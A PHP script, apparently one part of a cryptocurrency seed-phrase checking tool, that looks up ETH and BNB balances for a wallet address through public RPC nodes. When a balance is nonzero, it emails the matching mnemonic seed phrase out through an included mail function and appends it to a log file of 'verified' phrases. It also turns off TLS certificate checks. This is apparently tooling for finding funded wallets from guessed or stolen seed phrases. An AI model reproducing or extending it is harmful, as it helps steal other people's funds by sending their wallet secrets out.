<?php
include( dirname(__FILE__).'/faSonYouJian/fun.php');

# FaYouJian('ceshi', '这是PHP发送的');

function YuEChaXung
  (
  $po_strQianBaoDiZhi,   # 钱包地址
  $po_strSiYao           # 助记词地址
  )
{
  // 适配日本服务器 低延迟RPC节点 + 多备用轮询
  $chains = [
      '以太坊 ETH' => [
         ['https://ethereum.publicnode.com', 18],     // ✅ 稳
          ['https://cloudflare-eth.com/v1/mainnet', 18],// ✅ 国内友好
          ['https://eth.drpc.org', 18],                 // ✅ 快
          ['https://0xrpc.io/eth', 18],                 // ✅ 可用
          ['https://ethereum-mainnet.gateway.tatum.io', 18], // ✅ 可用
      ],
      '币安智能链 BNB' => [
          ['https://bsc-dataseed1.binance.org', 18],
          ['https://bsc-dataseed2.binance.org', 18]
      ],
      # 'Base' => [
      #     ['https://mainnet.base.org', 18],
      #     ['https://base.publicnode.com', 18]
      # ],
      # 'Linea' => [
      #     ['https://rpc.linea.build', 18],
      #     ['https://linea.publicnode.com', 18]
      # ],
      # 'Polygon MATIC' => [
      #      ['https://polygon-bor.publicnode.com', 18], // ✅ 稳
      #       ['https://matic-mainnet.chainstacklabs.com', 18], // ✅ 官方推荐
      #       ['https://polygon.api.onfinality.io/public', 18], // ✅ 可用
      #       ['https://poly.api.pocket.network', 18], // ✅ 可用
      #       ['https://polygon-mainnet.g.alchemy.com/v2/你的KEY', 18], // ✅ 最稳（需免费注册）
      # ],
      # 'Optimism OP' => [
      #     ['https://mainnet.optimism.io', 18],
      #     ['https://optimism.publicnode.com', 18]
      # ],
      # 'Arbitrum ARB' => [
      #     ['https://arb1.arbitrum.io/rpc', 18],
      #     ['https://arbitrum.publicnode.com', 18]
      # ],
      # 'Monad' => [
      #     ['https://testnet-rpc.monad.xyz', 18],
      #     ['https://monad-testnet.rpc.guru', 18]
      # ]
  ];

  // 输出结果
  echo "----------------------------------------\n";
  echo "助记词地址：{$po_strSiYao}\n";
  
  foreach ($chains as $name => $rpcList) {
      $result = getBalance($rpcList, $po_strQianBaoDiZhi);
      echo sprintf("%-16s: %s\n", $name, $result);
      if('节点全部请求失败' != $result and $result > 0 )
      {
        echo '助记词地址：'.$po_strSiYao.PHP_EOL;
        FaYouJian('余额查询成功', '这是助记词： '.$po_strSiYao);
        file_put_contents(dirname(__FILE__).'/jianyanhege.txt', $po_strSiYao.PHP_EOL, FILE_APPEND);
        exit;
      }
  }
}



/**
 * 16进制转10进制（兼容超大数值，避免base_convert溢出）
 */
function hexToDec(string $hex): string
{
    $hex = strtolower(trim($hex));
    $len = strlen($hex);
    $dec = '0';
    for ($i = 0; $i < $len; $i++) {
        $char = $hex[$i];
        $val  = ctype_digit($char) ? $char : (ord($char) - ord('a') + 10);
        $dec  = bcmul($dec, '16');
        $dec  = bcadd($dec, $val);
    }
    return $dec;
}

/**
 * 单个RPC请求
 */
function requestBalance(string $rpcUrl, string $address, int $decimals): ?string
{
    $postData = json_encode([
        "jsonrpc" => "2.0",
        "method"  => "eth_getBalance",
        "params"  => [$address, "latest"],
        "id"      => 1
    ]);

    $ch = curl_init($rpcUrl);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => $postData,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 12,
        CURLOPT_CONNECTTIMEOUT => 6,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_HTTPHEADER     => [
            'Content-Type: application/json',
            'User-Agent: Mozilla/5.0'
        ]
    ]);

    $resp = curl_exec($ch);
    $curlErr = curl_error($ch);
    curl_close($ch);

    if (!empty($curlErr) || empty($resp)) {
        return null;
    }

    $data = json_decode($resp, true);
    if (json_last_error() !== JSON_ERROR_NONE || isset($data['error'])) {
        return null;
    }

    $hexWei = ltrim($data['result'], '0x');
    $hexWei = $hexWei === '' ? '0' : $hexWei;
    $wei = hexToDec($hexWei);
    $div = bcpow('10', (string)$decimals);
    return bcdiv($wei, $div, 8);
}

/**
 * 多节点轮询查询
 */
function getBalance(array $rpcList, string $address): string
{
    foreach ($rpcList as $item) {
        list($rpc, $dec) = $item;
        $res = requestBalance($rpc, $address, $dec);
        if ($res !== null) {
            return $res;
        }
    }
    return "节点全部请求失败";
}






























?>